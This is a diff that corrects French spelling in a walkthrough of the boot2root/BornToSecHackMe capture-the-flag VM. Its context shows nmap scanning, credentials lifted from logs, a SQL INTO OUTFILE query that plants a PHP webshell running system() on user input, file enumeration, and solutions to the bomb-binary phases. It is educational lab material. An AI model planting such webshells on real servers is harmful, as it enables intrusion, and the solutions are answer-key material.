@@ -1,5 +1,5 @@
 # Recherche de l'IP de l'ISO boot2root
-On va utiliser **nmap**, qui va nous permet de scanner (dans un premier temps), les IP utilisées par VirtualBox :
+On va utiliser **nmap**, qui va nous permettre de scanner (dans un premier temps), les IP utilisées par VirtualBox :
 <pre><code>> nmap -sP IP-Vbox/24
 
 Nmap scan report for IP (IP)
@@ -58,12 +58,12 @@ On se dirige vers **/forum** où l'on  trouve un topic :
  <code>Probleme login ?</code>
 
 
-On voit que le topic est créé par **lmezard**, et que la page est rempli de log créé par un admin,
+On voit que le topic est créé par **lmezard**, et que la page est remplie de logs créés par un admin,
 on cherche donc le nom **lmezard** dans la page, et on tombe sur ceci:
 <pre><code>Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
 Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)</code></pre>
->On observe que **lmezard** a tapé son mdp a la place de sopn login: **!q\]Ej?*5K5cy*AJ**
+>On observe que **lmezard** a tapé son mdp à la place de son login: **!q\]Ej?*5K5cy*AJ**
 
 Par la suite, on se connecte au profil de lmezard sur le forum.
 
@@ -81,15 +81,15 @@ On tente de se connecter sur https://IP/webmail avec le même password et on dé
 <code>root/Fg-'kKXBj87E:aJ$
 </code>
 
-On se connecte phpmyadmin en tant que root. On a donc acces aux requestes sur la base de données, ce qui nous permet d'effectuer un **exploit** qui consite a créer un **Webshell** grâce a la query SQL.
+On se connecte phpmyadmin en tant que root. On a donc accès aux requêtes sur la base de données, ce qui nous permet d'effectuer un **exploit** qui consite a créer un **Webshell** grâce à la query SQL.
 
 ```sql
 SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
 INTO OUTFILE '/var/www/forum/templates_c/phpshell.php'
 ```
 
-On se dirige vers https://IP/forum/templates_c/phpshell.php (là ou est créer le **webshell**) et on tente de trouver des fichiers ou données a exploiter.
-On commence par lister tous les fichiers auquel l'user à accès :
+On se dirige vers https://IP/forum/templates_c/phpshell.php (là où est créé le **webshell**) et on tente de trouver des fichiers ou données à exploiter.
+On commence par lister tous les fichiers auquels l'user a accès :
 
 <pre><code>> find / -user www-data -print 2>/dev/null
 /home
@@ -104,7 +104,7 @@ lmezard:G!@M6f4Eatau{sF"
 </code></pre>
 
 On a donc un user et son password, mais il ne fonctionne pas en ssh.
-Cependant grâce au **nmap** effectuer au debut, on sait que le port **FTP** est ouvert (<code>21/tcp  open  ftp</code>), donc on utilise un logiciel tier (**Filezilla) pour se connecter avec 
+Cependant grâce au **nmap** effectué au debut, on sait que le port **FTP** est ouvert (<code>21/tcp  open  ftp</code>), donc on utilise un logiciel tiers (**Filezilla) pour se connecter avec 
 <pre><code>lmezard
 G!@M6f4Eatau{sF"</code></pre>
 
@@ -121,10 +121,10 @@ On cherche à savoir le type de fichier de fun :
 fun: POSIX tar archive (GNU)
 </code></pre>
 
-On le decompresse :
+On le décompresse :
 <pre><code>tar -xvf fun</code></pre>
 
-En lisant quelques fichiers, que chaque fichier contient un ligne de code en C et on se rend compte qu'il possedent un ordre :
+En lisant quelques fichiers, on voit que chaque fichier contient une ligne de code en C et on se rend compte qu'ils possèdent un ordre :
 <pre>//file***</pre>
 
 On créer donc un script en **python** qui va nous permettre de créer un fichier **main.c** qui contient la totalité de tous les fichiers mais mis dans l'ordre.
@@ -217,7 +217,7 @@ Dump of assembler code for function main:
    0x08048b0f <+351>:   call   0x804952c <phase_defused>
 ...
 ```
-> On observe qu'il y aura 6 phases a passer avant de pouvoir defuser la bombe
+> On observe qu'il y aura 6 phases à passer avant de pouvoir "defuse" la bombe
 
 ## Phase_1
 
@@ -285,7 +285,7 @@ Dump of assembler code for function phase_2:
    0x08048b96 <+78>:    ret
 End of assembler dump.
 ```
-On observe la presence d'une boucle :
+On observe la présence d'une boucle :
 ```
    0x08048b76 <+46>:    lea    0x1(%ebx),%eax
    0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax
@@ -304,7 +304,7 @@ Ainsi que ces deux lignes :
 
 On comprend donc que si la comparaison **%eax (%esi,%ebx,4)** ne fonctionne pas on appelle la fonction <code>explode_bomb</code>
 
-On fait donc un **breakpoint** sur la ligne 54, afin de voir à quelle valeur **%eax** est comparé.
+On fait donc un **breakpoint** sur la ligne 54, afin de voir à quelle valeur **%eax** est comparée.
 
 On sait que l'on a besoin d'effectuer cette action 6 fois car 6 nombres sont requis :
 ```
@@ -312,7 +312,7 @@ On sait que l'on a besoin d'effectuer cette action 6 fois car 6 nombres sont req
 ```
 
 
-Le resultat pour de la **phase_2** est donc :
+Le résultat pour de la **phase_2** est donc :
 <pre><code>1 2 6 24 120 720</code></pre>
 
 ## Phase_3
@@ -350,18 +350,18 @@ Dump of assembler code for function phase_3:
 0x08048c9e <+262>:    pop    %ebp
 0x08048c9f <+263>:    ret
 ```
-On sait que le resultat attendu sera :
+On sait que le résultat attendu sera :
 ```
 0x08048bb7 <+31>:    call   0x8048860 <sscanf@plt>	# ("%d %c %d")
 ```
 
-On sait aussi grâce a l'indice de README que le **%c** est 'b'.
+On sait aussi grâce à l'indice de README que le **%c** est 'b'.
 On cherche donc les deux nombres manquants.
 
 On sait que le premier nombre doit être inférieur a 7:
 <pre><code>0x08048bc9 <+49>:    cmpl   $0x7,-0xc(%ebp)</code></pre>
 
-De plus la ligne ci-dessous effectue un **jump** à l'adresse stocké à l'adresse 
+De plus la ligne ci-dessous effectue un **jump** à l'adresse stockée à l'adresse 
 **0x80497e8 + la valeur de notre premier argument * 4** :
 <pre><code>0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)</code></pre>
 
@@ -371,9 +371,9 @@ Si on affiche la range de notre adresse avec les 30 suivantes :
 0x80497e8:      0x08048be0      0x08048c00      0x08048c16      0x08048c28
 0x80497f8:      0x08048c40      0x08048c52      0x08048c64      >0x08048c76
 ```
-> On peut voir que **0x08048c00** correspond a un jump cohérent vers la ligne 104 de **phase_3**, donc 1 adresse plus loin.
+> On peut voir que **0x08048c00** correspond à un jump cohérent vers la ligne 104 de **phase_3**, donc 1 adresse plus loin.
 
-De plus, a cette valeur ce trouve :
+De plus, à cette valeur ce trouve :
 <pre><code>0x08048c00 <+104>:   mov    $0x62,%bl</code></pre>
 > Qui load la lettre b dans %bl
 
@@ -384,7 +384,7 @@ Et pour finir on observe:
 <pre><code>0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)</code></pre>
 > Qui compare la valeur 214 avec notre troisième argument.
 
-Le resultat pour de la **phase_3** est donc :
+Le résultat pour de la **phase_3** est donc :
 <pre><code>1 b 214</code></pre>
 
 ## Phase_4
@@ -480,11 +480,11 @@ int main(int ac, char **av)
 }
 ```
 
-A la fin de **phase_4** on compare le return de **func4** avec 55:
+À la fin de **phase_4** on compare le return de **func4** avec 55:
 <pre><code>   0x08048d1d <+61>:    cmp    $0x37,%eax</code></pre>
 > Apres plusieurs essais avec le code en **C**, on trouve que 9 nous donnes 55.
 
-Le resultat pour de la **phase_4** est donc :
+Le résultat pour de la **phase_4** est donc :
 <pre><code>9</code></pre>
 
 
@@ -535,7 +535,7 @@ Dump of assembler code for function phase_5:
 End of assembler dump.
 ```
 
-La phase 5 prends comment arguments une string puis vérifie sa taille, elle doit faire exactement 6 charactères:
+La phase 5 prend comme arguments une string puis vérifie sa taille, elle doit faire exactement 6 caractères:
 ```
    0x08048d3b <+15>:    call   0x8049018 <string_length>
    0x08048d40 <+20>:    add    $0x10,%esp
@@ -543,7 +543,7 @@ La phase 5 prends comment arguments une string puis vérifie sa taille, elle doi
    0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
    0x08048d48 <+28>:    call   0x80494fc <explode_bomb>
 ```
-La chaines de charactères est formater via cette boucle:
+La chaines de caractères est formatée via cette boucle:
 ```
    0x08048d4d <+33>:    xor    %edx,%edx				# set edx à 0
    0x08048d4f <+35>:    lea    -0x8(%ebp),%ecx			# load la string dans ecx
@@ -562,7 +562,7 @@ En testant l'aphabet on peux voir que :
 <pre>abcdefghijklmnopqrstuvwxyz
 srveawhobpnutfgisrveawhobp</pre>
 
-la phase_5 compare la string formater avec la valeur stocker dans :
+la phase_5 compare la string formatée avec la valeur stockée dans :
 ```
 (gdb)> x/s 0x804980b
 0x804980b:       "giants"
@@ -577,7 +577,7 @@ la phase_5 compare la string formater avec la valeur stocker dans :
    0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
 ```
 
-Le resultat pour de la **phase_5** est donc :
+Le résultat pour de la **phase_5** est donc :
 <pre><code>opekmq</code></pre>
 > A noter que plusieurs résultats sont possibles ici.
 
@@ -616,11 +616,11 @@ Dump of assembler code for function phase_6:
 End of assembler dump.
 ```
 
-On regardant le code, on se rend compte qu'il faut 6 arguments et que tous les nombres - 1 doit compris entre 0 et 5, donc entre 1 et 6 et de maniere unique.
+En regardant le code, on se rend compte qu'il faut 6 arguments et que tous les nombres - 1 doivent être compris entre 0 et 5, donc entre 1 et 6 et de manière unique.
 
 De plus avec le hint on sait que le premier nombre est 4.
 
-On a donc 120 possibilités d'arrangements. Il fait donc un script qui va tous tester :
+On a donc 120 possibilités d'arrangements. Il faut donc un script qui va tout tester :
 
 ```python
 import itertools
@@ -646,15 +646,6 @@ for i in unq:
 
 Le resultat pour de la **phase_6** est donc :
 <pre><code>4 2 6 3 1 5</code></pre>
-
-On obtient donc, si on suit ce que le README dit:
-
-<code>Publicspeakingisveryeasy.126241207201b2149opekmq426315</code>
-
-Cependant le mot de passe de l'ISO est :
-
-<code>Publicspeakingisveryeasy.126241207201b2149opekmq426135</code>
-> Le sujet n'est pas a jour, il faut inverser le char **n-1** avec le char **n-2**
 
 On obtient donc, si on suit ce que le README dit:
 
@@ -699,7 +690,7 @@ Avec SLASH dans MD5 on trouve : <code>646da671ca01bb5d84dbb5fb2238dc8e</code>
 qui est le mot de passe de zaz.
 
 # Partie Exploit Me
-En se connectant a zaz on trouve le binaire **./exploit_me**
+En se connectant à zaz on trouve le binaire **./exploit_me**
 
 ```
 > gdb -q ./exploit_me
